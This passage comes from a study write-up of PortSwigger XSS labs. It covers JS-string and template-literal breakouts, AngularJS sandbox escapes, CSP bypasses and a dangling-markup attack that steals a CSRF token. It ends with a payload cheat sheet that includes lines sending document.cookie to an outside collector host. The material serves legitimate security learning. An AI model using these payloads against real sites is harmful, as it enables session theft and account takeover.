// But: the content is inside a raw <script> block.
// Inject </script> to terminate the script block entirely:
// Input: </script><script>alert(1)//

// Resulting HTML:
<script>
var searchTerms = '</script><script>alert(1)//'
</script>

// The browser's HTML parser finds </script> and closes the script block.
// The remaining '<script>alert(1)//' is parsed as a new script tag.
// alert fires.
```

**Payload used:** `</script><script>alert(1)//`

> 📝 This works because the browser's HTML parser and JS parser run sequentially, not together. The HTML parser sees `</script>` and closes the block — it doesn't check if it's inside a JS string. The JS parser never even sees the broken string. This is a fundamental browser parsing quirk and a good reminder: even "safe" encoding of JS metacharacters can be bypassed if you change the parsing layer entirely.

---

### #22 — Reflected XSS into a JS string with angle brackets and double quotes HTML-encoded and single quotes escaped

**URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped  
**Vulnerability:** Search — inside a JS string  
**Aim:** Perform XSS that calls `alert`

**Background:**
Angle brackets encoded, double quotes encoded, single quotes escaped with `\`. The `</script>` trick from Lab 21 is blocked (angle brackets encoded). You need to stay inside the JS string context and use a different escape.

**Analysis:**
```javascript
// Page source:
<script>
var searchTerms = 'test';
</script>

// Input: \' → server escapes to: \\'
// Resulting JS: var searchTerms = '\\'  ← the \\ is a literal backslash!
// The ' after it is now OUTSIDE the string — it closes it.

// Inject: \';alert(1)//
// Server escapes the \: \\';alert(1)//
// Resulting JS:
var searchTerms = '\\';alert(1)//'
//                  ^^ literal backslash  ^ closes string
// alert(1) is now a separate statement → executes.
```

**Payload used:** `\';alert(1)//`

> 📝 The `\'` escape is defeated by injecting `\'` — the server turns `\` into `\\` and leaves `'` escaped as `\'`. But `\\'` in JS is `\\` (literal backslash) followed by `'` (close quote). Your extra `\` effectively "eats" the server's escape. This is a classic escape-the-escaper technique — worth remembering whenever a server escapes quotes.

---

### #23 — Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

**URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped  
**Vulnerability:** Comment "website" field → placed into `onclick` attribute  
**Aim:** Submit a comment that calls `alert(document.cookie)` when the author name is clicked

**Background:**
The website URL ends up in an `onclick` handler. Angle brackets are HTML-encoded, single quotes escaped, backslash escaped. But HTML attributes support HTML entity encoding — and `&#x27;` is a `'` that the **browser decodes** before executing the JS handler, bypassing the server-side escaping.

**Analysis:**
```
Comment website: http://foo?&apos;-alert(document.cookie)-&apos;

OR using hex entities:
http://foo?&#x27;-alert(document.cookie)-&#x27;

Resulting HTML in onclick:
<a href="http://foo" onclick="var tracker={track(){}};tracker.track('http://foo?&#x27;-alert(document.cookie)-&#x27;');">

Browser HTML-decodes &#x27; to ' before executing onclick JS:
tracker.track('http://foo?'-alert(document.cookie)-'')
→ alert fires when the link is clicked.
```

**Payload used (in website field):** `http://foo?&apos;-alert(document.cookie)-&apos;`

> 📝 HTML entity encoding happens at a **different layer** than JS string escaping. The server escapes `'` in the JS context, but `&#x27;` and `&apos;` look harmless to the server (they're HTML entities, not quotes). When the browser renders the attribute, it **HTML-decodes first, then executes the JS** — so `&#x27;` becomes `'` right before the onclick handler runs. Two layers of parsing = two potential escape routes.

---

### #24 — Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

**URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped  
**Vulnerability:** Search — input lands inside a JS template literal  
**Aim:** Perform XSS that calls `alert`

**Background:**
Input is inside a JavaScript template literal (backtick string). All traditional break-out characters are escaped — but template literals support `${}` expression syntax, and that syntax is NOT a quote character. You don't need to break out of the string at all.

**Analysis:**
```javascript
// Page source:
<script>
var message = `0 search results for 'test'`;
</script>

// Backticks escaped to unicode: can't break out with `
// Single/double quotes escaped — can't break the template literal

// BUT: ${} expressions inside template literals are evaluated as JS:
// Inject: ${alert(1)}

// Resulting JS:
var message = `0 search results for '${alert(1)}'`;
// The ${alert(1)} is evaluated as an expression → alert fires.
// No string break-out needed at all.
```

**Payload used:** `${alert(1)}`

> 📝 Template literals (backtick strings) are a JavaScript ES6 feature. The `${}` interpolation syntax executes arbitrary JS expressions and inserts the result. Even if every quote character is escaped, `${...}` is still active inside a template literal — there's no escaping of the `$` or `{` characters here. Whenever you see input inside backticks, try `${alert(1)}` immediately.

---

### #25 — Reflected XSS with event handlers and `href` attributes blocked

**URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked  
**Vulnerability:** Search — WAF blocks all event handlers and href  
**Aim:** Perform XSS that calls `alert` using the PortSwigger XSS cheat sheet technique

**Background:**
All event attributes (`on*`) are blocked. `href="javascript:..."` is blocked. You need a tag that executes JS without an event handler or href.

**Analysis:**
```html
<!-- SVG <animate> with values= that triggers script execution -->
<!-- Use <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg> -->

<!-- The <animate> tag changes the href attribute of <a> to javascript:alert(1) -->
<!-- User clicks the text → executes JS -->

Payload:
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>
```

> 📝 SVG `<animate>` can modify other elements' attributes over time — including setting `href` on an `<a>` tag to `javascript:alert(1)`. Since the `href` attribute isn't written directly (it's animated in), WAF rules that block `href=javascript:` in raw input don't catch it. This is a great example of why XSS defence can't rely on simple keyword blocking.

---

### #26 — Reflected XSS in a JavaScript URL with some characters blocked

**URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-with-some-characters-blocked  
**Vulnerability:** Back link — input placed into a `javascript:` URL  
**Aim:** Perform XSS that calls `alert` with a `throw` statement (parentheses blocked)

**Background:**
Input lands inside a `javascript:` href, but parentheses `()` are blocked. Without `()` you can't call functions normally. The solution uses `throw` with an exception handler to call `alert` without parentheses.

**Analysis:**
```javascript
// Existing href:
javascript:fetch('/analytics', {method:'post',body:'/post?postId=5'}).finally(_ => window.location = '/')

// Inject to override the finally callback with something that calls alert:
// Input (URL-decoded): &'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+''

// Breakdown:
// &'} — closes the existing string and object literal
// ,x=x=>{throw/**/onerror=alert,1337} — defines x as an arrow function
//    throw triggers the global onerror handler (which we set to alert)
//    1337 is the value thrown — alert receives it as the message
// ,toString=x,window+'' — triggers x by coercing window to a string (calls toString → x → throw)
```

**Payload used:** `&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+''`

> 📝 When parentheses are blocked, `throw` + `onerror` is a key bypass. Setting `window.onerror = alert` makes `alert` the handler for uncaught exceptions. Then `throw 1337` calls `alert(1337)` without any parentheses. Template literals — `alert\`1\`` — are another parenthesis-free call method. These are important to know for CTFs and hardened apps.

---

### #27 — Reflected XSS with AngularJS sandbox escape without strings

**URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox/lab-angular-sandbox-escape-without-strings  
**Vulnerability:** Search — AngularJS expression, string literals blocked  
**Aim:** Perform XSS that calls `alert(1)` without using any string literals

**Background:**
The AngularJS sandbox restricts what expressions can do. On top of that, string literals are blocked. You need to call `alert(1)` using only numbers, operators, and AngularJS scope properties.

**Analysis:**
```javascript
// Blocked: any quoted string ('...', "...")
// Working inside AngularJS {{ }} template expression

// $eval executes an expression. toString().constructor gives us the String constructor.
// fromCharCode turns numbers into characters — builds strings without string literals:

1&toString().constructor.fromCharCode(120)  // x
// Build "alert(1)" from char codes:
// a=97, l=108, e=101, r=114, t=116, (=40, 1=49, )=41

// Full payload (AngularJS expression):
{{toString().constructor.fromCharCode(120)=alert(1)}}
// OR using $on to get a function reference without strings
```

**Payload used:** `1&toString().constructor.fromCharCode(120)` (varies by AngularJS version; check cheat sheet)

> 📝 AngularJS sandbox escapes are version-specific — each version patched known bypasses. The core technique is getting access to native JS objects (`String.fromCharCode`, `Function`, etc.) through AngularJS scope properties, then constructing the payload character by character. In modern apps, AngularJS is largely replaced by Angular (v2+), which doesn't have this issue — but older apps still run AngularJS 1.x.

---

### #28 — Reflected XSS with AngularJS sandbox escape and CSP

**URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox/lab-angular-sandbox-escape-and-csp  
**Vulnerability:** Search — AngularJS + Content Security Policy active  
**Aim:** Perform XSS that calls `alert(document.cookie)` delivered via exploit server

**Background:**
CSP (Content Security Policy) is a browser security header that restricts which scripts can run. Inline `<script>` tags and inline event handlers are typically blocked. Combining a sandbox escape with CSP bypass requires finding a whitelisted CSP source that also serves AngularJS content you can exploit.

**Analysis:**
```
CSP header: script-src 'self' (only scripts from the same origin allowed)

Approach: use AngularJS ng-focus directive (allowed by CSP because it's handled by AngularJS,
not a raw event handler). The ng-focus payload uses $event.composedPath() with the orderBy
filter to reach the window object and call alert without an explicit window reference.

Deliver via exploit server:
<script>
location='https://TARGET.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>

URL-decoded payload injected into search:
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x

Breakdown:
- ng-focus is an AngularJS directive → CSP doesn't block it (it's not a raw event handler)
- $event.composedPath() returns the array of DOM elements that triggered the event
- |orderBy: passes each element through the orderBy filter with our expression as argument
- (z=alert) assigns alert to z without calling it directly (avoids window check)
- (document.cookie) calls z (alert) with cookie as argument when window is reached
- The #x fragment auto-focuses the element on load → fires ng-focus immediately
```

**Payload (delivered via exploit server location redirect):**
`<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x`

> 📝 CSP `'self'` whitelists all same-origin scripts — including AngularJS loaded from the same server. When AngularJS is loaded from a CSP-whitelisted source, AngularJS expression injection **is** CSP-compliant because the browser only sees AngularJS doing its normal job. The `orderBy` filter trick reaches the `window` object indirectly, bypassing AngularJS's explicit window reference check. This is why the CSP spec now explicitly warns against using AngularJS on pages with sensitive CSP policies.

---

### #29 — Reflected XSS protected by very strict CSP, with dangling markup attack

**URL:** https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack  
**Vulnerability:** Email change form — reflected XSS, but strict CSP blocks script execution  
**Aim:** Bypass CSP using a dangling markup / form hijacking attack to steal the victim's CSRF token, then change their email

**Background:**
CSP is so strict that no script can run. You can still reflect HTML — but you can't execute it. The alternative is **dangling markup injection**: inject an unclosed HTML attribute that "eats" the following page content (including the CSRF token) and sends it to your server via an HTML tag's `src` or `action` attribute.

Here the trick is even more targeted — inject a button with a `formaction` pointing to your exploit server, and force the form to submit via GET so the CSRF token appears in the URL you receive.

**Analysis:**
```
Step 1: Identify the injection point
- The email change form reflects the ?email= parameter into the page.
- Common XSS payloads are blocked by CSP.
- Client-side validation blocks non-email formats — bypass by changing input type to "text" in DevTools.

Step 2: Confirm CSP blocks execution
- Inject: ?email=<img src onerror=alert(1)>
- Payload reflects in page but DevTools console shows CSP blocked it.

Step 3: Check for missing form-action directive in CSP
- If CSP has no form-action directive, injected buttons can redirect form submissions anywhere.

Step 4: Inject a button that hijacks the form submission
?email=foo@bar"><button formaction="https://EXPLOIT-SERVER/exploit">Click me</button>

- The " closes the email attribute
- The button's formaction overrides the form's own action
- Victim clicks "Click me" → form submits to your server

Step 5: Add formmethod="get" so the CSRF token appears in the URL
?email=foo@bar"><button formaction="https://EXPLOIT-SERVER/exploit" formmethod="get">Click me</button>

- When victim clicks → your server receives a GET request with ?csrf=TOKEN in URL

Step 6: Automate the full attack via exploit server
The exploit server script:
1. First visit: no CSRF token in URL → redirect victim to the lab page with the injected button
2. Victim clicks → redirected to exploit server WITH the CSRF token in URL
3. Second visit: CSRF token present → use it to POST /my-account/change-email

<script>
const labUrl = "https://YOUR-LAB-ID.web-security-academy.net/";
const exploitUrl = "https://YOUR-EXPLOIT-SERVER.net/exploit";
const url = new URL(location);
const csrf = url.searchParams.get('csrf');
if (csrf) {
    const form = document.createElement('form');
    form.method = 'post';
    form.action = labUrl + 'my-account/change-email';
    const emailInput = document.createElement('input');
    emailInput.name = 'email';
    emailInput.value = 'hacker@evil-user.net';
    const csrfInput = document.createElement('input');
    csrfInput.name = 'csrf';
    csrfInput.value = csrf;
    form.append(emailInput, csrfInput);
    document.body.append(form);
    form.submit();
} else {
    location = labUrl + 'my-account?email=foo%40bar%22%3E%3Cbutton+formaction='
               + exploitUrl + '+formmethod=get%3EClick+me%3C/button%3E';
}
</script>
```

**Steps:**
1. Identify the injection point and confirm CSP blocks script execution
2. Verify CSP has no `form-action` directive (check DevTools → Network → response headers)
3. Manually test the button injection and confirm CSRF token appears in exploit server logs
4. Store the full two-phase script on the exploit server
5. Deliver to victim → lab solved when email changes to `hacker@evil-user.net`

> 📝 **Dangling markup injection** is what you reach for when XSS is fully blocked by CSP but you can still inject HTML. The `formaction` attribute on a `<button>` overrides the parent form's action — this is standard HTML5 behaviour, not a bug. The `formmethod="get"` trick moves POST body data into the URL, making the CSRF token readable from server logs. The attack takes two round trips: first steal the token, then use it. This is a real-world technique used against apps with strong CSP but missing `form-action` in their policy.

---

### #30 — Reflected XSS protected by CSP, with CSP bypass

**URL:** https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass  
**Vulnerability:** Search — reflected XSS blocked by CSP, but CSP header is injectable  
**Aim:** Perform XSS that calls `alert` by bypassing the CSP  
**Note:** Intended solution is Chrome-only.

**Background:**
The CSP header contains a `report-uri` directive with a user-controlled `token` parameter. CSP headers are just strings — if part of the value is user-controlled, you can **inject new CSP directives** into the policy itself. By injecting `script-src-elem 'unsafe-inline'`, you override the restrictive `script-src` and allow inline scripts to run.

**Analysis:**
```
Normal CSP response header:
Content-Security-Policy: default-src 'self'; object-src 'none';
script-src 'self'; style-src 'self'; report-uri /csp-report?token=

The token parameter value is reflected directly into the CSP header.

Inject a new directive by appending it to the token value:
token=;script-src-elem 'unsafe-inline'

Resulting CSP header:
Content-Security-Policy: default-src 'self'; object-src 'none';
script-src 'self'; style-src 'self';
report-uri /csp-report?token=;script-src-elem 'unsafe-inline'

The semicolon ends the report-uri value and starts a NEW directive.
script-src-elem 'unsafe-inline' allows inline <script> tags.
script-src-elem is more specific than script-src → it overrides it.

Full attack URL:
https://YOUR-LAB-ID.web-security-academy.net/?search=<script>alert(1)</script>&token=;script-src-elem%20'unsafe-inline'

Result: the XSS payload is reflected AND now allowed by the injected CSP directive → alert fires.
```

**Payload used:**
- Search: `<script>alert(1)</script>`
- Token: `;script-src-elem 'unsafe-inline'`
- Full URL: `/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'`

> 📝 This is a rare but real class of vulnerability: **CSP header injection**. If any part of the CSP header value comes from user input without proper sanitisation, an attacker can terminate one directive (with `;`) and inject a new, more permissive one. `script-src-elem` was introduced as a more granular control than `script-src` — and in Chrome, a more specific directive takes precedence. The fix is simple: never reflect user input into HTTP response headers. This is also related to **HTTP response header injection**, which can enable other attacks (cookie injection, redirect, cache poisoning).

---

## REFERENCE — XSS CONTEXT CHEAT SHEET

| Context | Example | Break-out technique |
|---|---|---|
| HTML body | `<p>INPUT</p>` | `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>` |
| HTML attribute (double-quoted) | `value="INPUT"` | `" onmouseover="alert(1)` |
| HTML attribute (single-quoted) | `value='INPUT'` | `' onmouseover='alert(1)` |
| HTML attribute (unquoted) | `value=INPUT` | `x onmouseover=alert(1)` |
| href / src | `href="INPUT"` | `javascript:alert(1)` |
| JS string (single-quoted) | `var x='INPUT'` | `';alert(1)//` |
| JS string (double-quoted) | `var x="INPUT"` | `";alert(1)//` |
| JS template literal | `` var x=`INPUT` `` | `${alert(1)}` |
| onclick / event handler | `onclick="INPUT"` | `alert(1)` |
| `<script>` block | `<script>INPUT</script>` | `</script><script>alert(1)` |
| AngularJS `{{ }}` | `<div>{{INPUT}}</div>` | `{{constructor.constructor('alert(1)')()}}` |

---

## REFERENCE — USEFUL XSS PAYLOADS

```html
<!-- Basic proof of concept -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>

<!-- When angle brackets are blocked (attribute context) -->
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="

<!-- href context -->
javascript:alert(document.cookie)

<!-- JS string context -->
';alert(1)//
\';alert(1)//
${alert(1)}

<!-- Parentheses blocked -->
alert`1`
throw onerror=alert,1337

<!-- Cookie theft -->
<script>fetch('https://COLLAB.NET',{method:'POST',mode:'no-cors',body:document.cookie})</script>
<script>document.location='https://COLLAB.NET/?c='+document.cookie</script>

<!-- CSP bypass (when AngularJS loaded from self) -->
{{constructor.constructor('alert(1)')()}}
```

---

## REFERENCE — IMPORTANT COOKIE FLAGS

| Flag | Effect on XSS |
|---|---|
| **HttpOnly** | `document.cookie` returns nothing for this cookie — blocks JS-based cookie theft |
| **Secure** | Cookie only sent over HTTPS — doesn't affect XSS impact directly |
| **SameSite=Strict** | Cookie not sent on cross-site requests — mitigates CSRF but not XSS |
| **SameSite=Lax** | Sent on top-level navigations — partial CSRF protection |
| **SameSite=None** | No restriction — cookie sent on all cross-site requests |

> 📝 Always check cookie flags in DevTools (Application → Cookies). `HttpOnly` limits XSS to non-cookie attacks (password capture, DOM manipulation, CSRF). Missing `HttpOnly` on a session cookie = cookie theft → account takeover.

---

## REFERENCE — CSP BASICS

```
Content-Security-Policy: script-src 'self' 'nonce-abc123' https://trusted.cdn.com
```

| Directive value | Meaning |
|---|---|
| `'self'` | Only scripts from the same origin |
| `'none'` | No scripts allowed at all |
| `'unsafe-inline'` | Allows inline `<script>` and event handlers — **effectively disables CSP** |
| `'unsafe-eval'` | Allows `eval()` — weakens CSP significantly |
| `'nonce-xyz'` | Only scripts with `<script nonce="xyz">` run |
| `'strict-dynamic'` | Trusted scripts can load additional scripts |
| `https://cdn.com` | Scripts from this specific domain allowed |

> 📝 If CSP contains `'unsafe-inline'` or `*` wildcards, it provides almost no protection. A CSP that whitelists a CDN hosting AngularJS (like `ajax.googleapis.com`) can be bypassed using AngularJS template injection. Always check the CSP header first (DevTools → Network → response headers) before deciding your XSS approach.
